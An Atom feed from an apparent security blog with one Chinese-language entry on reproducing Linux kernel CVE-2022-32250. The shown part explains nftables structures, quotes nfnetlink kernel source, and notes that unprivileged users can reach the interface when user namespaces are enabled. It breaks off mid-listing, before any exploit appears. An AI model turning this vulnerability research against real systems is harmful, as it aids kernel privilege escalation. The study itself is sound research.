<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>196082&#39;s blog</title>
  
  
  <link href="https://cv196082.gitee.io/atom.xml" rel="self"/>
  
  <link href="https://cv196082.gitee.io/"/>
  <updated>2023-09-06T01:57:06.422Z</updated>
  <id>https://cv196082.gitee.io/</id>
  
  <author>
    <name>196082</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2022–32250</title>
    <link href="https://cv196082.gitee.io/2023/09/06/CVE-2022%E2%80%9332250/"/>
    <id>https://cv196082.gitee.io/2023/09/06/CVE-2022%E2%80%9332250/</id>
    <published>2023-09-06T01:57:12.000Z</published>
    <updated>2023-09-06T01:57:06.422Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为工作目前面对着一个不怎么熟悉的<code>netfilter</code>这一模块，所以直接复现一个以往的CVE来认识认识这个模块。</p><p>这里介绍这个模块可能不会很好，所以不熟悉的朋友可以去看 <a class="link"   href="https://www.secrss.com/articles/44817" >https://www.secrss.com/articles/44817<i class="fas fa-external-link-alt"></i></a> 这篇文章。</p><h2 id="nftables介绍"><a href="#nftables介绍" class="headerlink" title="nftables介绍"></a>nftables介绍</h2><p><code>nftables</code>取代了流行的<code>&#123;ip,ip6,arp,eb&#125;tables</code>。该软件提供了一个新的内核数据包分类框架，该框架基于特定于网络的虚拟机 (VM) 和新的nft用户空间命令行工具。<code>nftables</code>重用了现有的<code>netfilter</code>子系统，例如现有的钩子基础设施、连接跟踪系统、NAT、用户空间队列和日志子系统。对于<code>nftables</code>，只需要扩展<code>expression</code>即可，用户自行编写<code>expression</code>，然后让<code>nftables</code>虚拟机执行它。<code>nftables</code>框架的数据结构如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Table&#123;</span><br><span class="line">   Chain[</span><br><span class="line">     Rule</span><br><span class="line">       (expression1,expression2,expression3,...)</span><br><span class="line">          | | |--&gt; expression_action</span><br><span class="line">          | |--&gt; expression_action</span><br><span class="line">          |--&gt;expression_action</span><br><span class="line">     Rule</span><br><span class="line">         (expression,expression,expression,...)</span><br><span class="line">     ...</span><br><span class="line">  ],</span><br><span class="line">  Chain[</span><br><span class="line">     ...</span><br><span class="line">  ],</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Table</code>为<code>chain</code>的容器，<code>chain</code>为<code>rule</code>的容器，<code>rule</code>为<code>expression</code>的容器，<code>expression</code>响应<code>action</code>。构造成由 <code>table-&gt;chain-&gt;rule-&gt;expression</code> 四级组成的数据结构。</p><h3 id="nfnetlink初始化"><a href="#nfnetlink初始化" class="headerlink" title="nfnetlink初始化"></a>nfnetlink初始化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __net_init <span class="title">nfnetlink_net_init</span><span class="params">(struct net *net)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">nfnl</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_kernel_cfg</span> <span class="title">cfg</span> =</span> &#123;</span><br><span class="line">.groups= NFNLGRP_MAX,</span><br><span class="line">.input= nfnetlink_rcv,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MODULES</span></span><br><span class="line">.bind= nfnetlink_bind,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">nfnl = netlink_kernel_create(net, NETLINK_NETFILTER, &amp;cfg);</span><br><span class="line"><span class="keyword">if</span> (!nfnl)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">net-&gt;nfnl_stash = nfnl;</span><br><span class="line">rcu_assign_pointer(net-&gt;nfnl, nfnl);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>nfnetlink_net_init</code>函数中定义了<code>netlink_kernel_cfg</code>结构，并传给了<code>netlink_kernel_create</code>进行创建。在后续接收消息的时候就会调用<code>nfnetlink_rcv</code>函数了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nfnetlink_rcv</span><span class="params">(struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span> =</span> nlmsg_hdr(skb);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (skb-&gt;len &lt; NLMSG_HDRLEN ||</span><br><span class="line">    nlh-&gt;nlmsg_len &lt; NLMSG_HDRLEN ||</span><br><span class="line">    skb-&gt;len &lt; nlh-&gt;nlmsg_len)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!netlink_net_capable(skb, CAP_NET_ADMIN)) &#123;</span><br><span class="line">netlink_ack(skb, nlh, -EPERM, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_type == NFNL_MSG_BATCH_BEGIN)</span><br><span class="line">nfnetlink_rcv_skb_batch(skb, nlh);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">netlink_rcv_skb(skb, nfnetlink_rcv_msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中需要<code>CAP_NET_ADMIN</code>才能访问，如果编译时开启了<code>CONFIG_USER_NS</code>那么普通用户也是可以访问的。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/6ac5d3cf17c1409d62d979bf0ee4fa12.png"                                     ></p><p>以上就是<code>nfnetlink</code>接收消息的完整调用链了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nfnetlink_rcv_batch</span><span class="params">(struct sk_buff *skb, struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="params"><span class="function">u16 subsys_id, u32 genid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">oskb</span> =</span> skb;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> sock_net(skb-&gt;sk);</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfnetlink_subsystem</span> *<span class="title">ss</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfnl_callback</span> *<span class="title">nc</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_ext_ack</span> <span class="title">extack</span>;</span></span><br><span class="line">LIST_HEAD(err_list);</span><br><span class="line">u32 status;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (subsys_id &gt;= NFNL_SUBSYS_COUNT)</span><br><span class="line"><span class="keyword">return</span> netlink_ack(skb, nlh, -EINVAL, <span class="literal">NULL</span>);</span><br><span class="line">replay:</span><br><span class="line">status = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">skb = netlink_skb_clone(oskb, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!skb)</span><br><span class="line"><span class="keyword">return</span> netlink_ack(oskb, nlh, -ENOMEM, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">nfnl_lock(subsys_id);</span><br><span class="line">ss = nfnl_dereference_protected(subsys_id);</span><br><span class="line"><span class="keyword">if</span> (!ss) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MODULES</span></span><br><span class="line">nfnl_unlock(subsys_id);</span><br><span class="line">request_module(<span class="string">&quot;nfnetlink-subsys-%d&quot;</span>, subsys_id);</span><br><span class="line">nfnl_lock(subsys_id);</span><br><span class="line">ss = nfnl_dereference_protected(subsys_id);</span><br><span class="line"><span class="keyword">if</span> (!ss)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#123;</span><br><span class="line">nfnl_unlock(subsys_id);</span><br><span class="line">netlink_ack(oskb, nlh, -EOPNOTSUPP, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span> kfree_skb(skb);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ss-&gt;valid_genid || !ss-&gt;commit || !ss-&gt;<span class="built_in">abort</span>) &#123;</span><br><span class="line">nfnl_unlock(subsys_id);</span><br><span class="line">netlink_ack(oskb, nlh, -EOPNOTSUPP, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span> kfree_skb(skb);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!try_module_get(ss-&gt;owner)) &#123;</span><br><span class="line">nfnl_unlock(subsys_id);</span><br><span class="line">netlink_ack(oskb, nlh, -EOPNOTSUPP, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span> kfree_skb(skb);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ss-&gt;valid_genid(net, genid)) &#123;</span><br><span class="line">module_put(ss-&gt;owner);</span><br><span class="line">nfnl_unlock(subsys_id);</span><br><span class="line">netlink_ack(oskb, nlh, -ERESTART, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span> kfree_skb(skb);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nfnl_unlock(subsys_id);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (skb-&gt;len &gt;= nlmsg_total_size(<span class="number">0</span>)) &#123;</span><br><span class="line"><span class="keyword">int</span> msglen, type;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fatal_signal_pending(current)) &#123;</span><br><span class="line">nfnl_err_reset(&amp;err_list);</span><br><span class="line">err = -EINTR;</span><br><span class="line">status = NFNL_BATCH_FAILURE;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;extack, <span class="number">0</span>, <span class="keyword">sizeof</span>(extack));</span><br><span class="line">nlh = nlmsg_hdr(skb);</span><br><span class="line">err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_len &lt; NLMSG_HDRLEN ||</span><br><span class="line">    skb-&gt;len &lt; nlh-&gt;nlmsg_len ||</span><br><span class="line">    nlmsg_len(nlh) &lt; <span class="keyword">sizeof</span>(struct nfgenmsg)) &#123;</span><br><span class="line">nfnl_err_reset(&amp;err_list);</span><br><span class="line">status |= NFNL_BATCH_FAILURE;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only requests are handled by the kernel */</span></span><br><span class="line"><span class="keyword">if</span> (!(nlh-&gt;nlmsg_flags &amp; NLM_F_REQUEST)) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> ack;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type = nlh-&gt;nlmsg_type;</span><br><span class="line"><span class="keyword">if</span> (type == NFNL_MSG_BATCH_BEGIN) &#123;</span><br><span class="line"><span class="comment">/* Malformed: Batch begin twice */</span></span><br><span class="line">nfnl_err_reset(&amp;err_list);</span><br><span class="line">status |= NFNL_BATCH_FAILURE;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == NFNL_MSG_BATCH_END) &#123;</span><br><span class="line">status |= NFNL_BATCH_DONE;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (type &lt; NLMSG_MIN_TYPE) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> ack;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We only accept a batch with messages for the same</span></span><br><span class="line"><span class="comment"> * subsystem.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (NFNL_SUBSYS_ID(type) != subsys_id) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> ack;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nc = nfnetlink_find_client(type, ss);</span><br><span class="line"><span class="keyword">if</span> (!nc) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> ack;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> min_len = nlmsg_total_size(<span class="keyword">sizeof</span>(struct nfgenmsg));</span><br><span class="line">u8 cb_id = NFNL_MSG_TYPE(nlh-&gt;nlmsg_type);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">cda</span>[<span class="title">NFNL_MAX_ATTR_COUNT</span> + 1];</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr</span> =</span> (<span class="keyword">void</span> *)nlh + min_len;</span><br><span class="line"><span class="keyword">int</span> attrlen = nlh-&gt;nlmsg_len - min_len;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Sanity-check NFTA_MAX_ATTR */</span></span><br><span class="line"><span class="keyword">if</span> (ss-&gt;cb[cb_id].attr_count &gt; NFNL_MAX_ATTR_COUNT) &#123;</span><br><span class="line">err = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> ack;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = nla_parse(cda, ss-&gt;cb[cb_id].attr_count, attr,</span><br><span class="line">attrlen, ss-&gt;cb[cb_id].policy, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> ack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nc-&gt;call_batch) &#123;</span><br><span class="line">err = nc-&gt;call_batch(net, net-&gt;nfnl, skb, nlh,</span><br><span class="line">     (<span class="keyword">const</span> struct nlattr **)cda,</span><br><span class="line">     &amp;extack);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The lock was released to autoload some module, we</span></span><br><span class="line"><span class="comment"> * have to abort and start from scratch using the</span></span><br><span class="line"><span class="comment"> * original skb.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (err == -EAGAIN) &#123;</span><br><span class="line">status |= NFNL_BATCH_REPLAY;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ack:</span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_ACK || err) &#123;</span><br><span class="line"><span class="comment">/* Errors are delivered once the full batch has been</span></span><br><span class="line"><span class="comment"> * processed, this avoids that the same error is</span></span><br><span class="line"><span class="comment"> * reported several times when replaying the batch.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (nfnl_err_add(&amp;err_list, nlh, err, &amp;extack) &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* We failed to enqueue an error, reset the</span></span><br><span class="line"><span class="comment"> * list of errors and send OOM to userspace</span></span><br><span class="line"><span class="comment"> * pointing to the batch header.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">nfnl_err_reset(&amp;err_list);</span><br><span class="line">netlink_ack(oskb, nlmsg_hdr(oskb), -ENOMEM,</span><br><span class="line">    <span class="literal">NULL</span>);</span><br><span class="line">status |= NFNL_BATCH_FAILURE;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* We don&#x27;t stop processing the batch on errors, thus,</span></span><br><span class="line"><span class="comment"> * userspace gets all the errors that the batch</span></span><br><span class="line"><span class="comment"> * triggers.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line">status |= NFNL_BATCH_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">msglen = NLMSG_ALIGN(nlh-&gt;nlmsg_len);</span><br><span class="line"><span class="keyword">if</span> (msglen &gt; skb-&gt;len)</span><br><span class="line">msglen = skb-&gt;len;</span><br><span class="line">skb_pull(skb, msglen);</span><br><span class="line">&#125;</span><br><span class="line">done:</span><br><span class="line"><span class="keyword">if</span> (status &amp; NFNL_BATCH_REPLAY) &#123;</span><br><span class="line">ss-&gt;<span class="built_in">abort</span>(net, oskb);</span><br><span class="line">nfnl_err_reset(&amp;err_list);</span><br><span class="line">kfree_skb(skb);</span><br><span class="line">module_put(ss-&gt;owner);</span><br><span class="line"><span class="keyword">goto</span> replay;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (status == NFNL_BATCH_DONE) &#123;</span><br><span class="line">err = ss-&gt;commit(net, oskb);</span><br><span class="line"><span class="keyword">if</span> (err == -EAGAIN) &#123;</span><br><span class="line">status |= NFNL_BATCH_REPLAY;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (err) &#123;</span><br><span class="line">ss-&gt;<span class="built_in">abort</span>(net, oskb);</span><br><span class="line">netlink_ack(oskb, nlmsg_hdr(oskb), err, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">ss-&gt;<span class="built_in">abort</span>(net, oskb);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ss-&gt;cleanup)</span><br><span class="line">ss-&gt;cleanup(net);</span><br><span class="line"></span><br><span class="line">nfnl_err_deliver(&amp;err_list, oskb);</span><br><span class="line">kfree_skb(skb);</span><br><span class="line">module_put(ss-&gt;owner);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先通过</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss = nfnl_dereference_protected(subsys_id);</span><br></pre></td></tr></table></figure><p>取出<code>subsys_id</code>对应的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_NONE 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_CTNETLINK1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_CTNETLINK_EXP2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_QUEUE3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_ULOG4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_OSF5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_IPSET6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_ACCT7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_CTNETLINK_TIMEOUT8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_CTHELPER9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_NFTABLES10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_NFT_COMPAT11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_HOOK12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_COUNT13</span></span><br></pre></td></tr></table></figure><p>这里我们对<code>nftables</code>进行操作那就很明显是0xa</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> struct nfnl_callback *</span></span><br><span class="line"><span class="function"><span class="title">nfnetlink_find_client</span><span class="params">(u16 type, <span class="keyword">const</span> struct nfnetlink_subsystem *ss)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">u8 cb_id = NFNL_MSG_TYPE(type);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cb_id &gt;= ss-&gt;cb_count)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &amp;ss-&gt;cb[cb_id];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在获得<code>subsystem</code>之后就会进入上面的函数，拿到对应的客户端</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfnetlink_subsystem</span> <span class="title">nf_tables_subsys</span> =</span> &#123;</span><br><span class="line">    .name       = <span class="string">&quot;nf_tables&quot;</span>,</span><br><span class="line">    .subsys_id  = NFNL_SUBSYS_NFTABLES,</span><br><span class="line">    .cb_count   = NFT_MSG_MAX,</span><br><span class="line">    .cb     = nf_tables_cb,</span><br><span class="line">    .commit     = nf_tables_commit,</span><br><span class="line">    .<span class="built_in">abort</span>      = nf_tables_abort,</span><br><span class="line">    .cleanup    = nf_tables_cleanup,</span><br><span class="line">    .valid_genid    = nf_tables_valid_genid,</span><br><span class="line">    .owner      = THIS_MODULE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 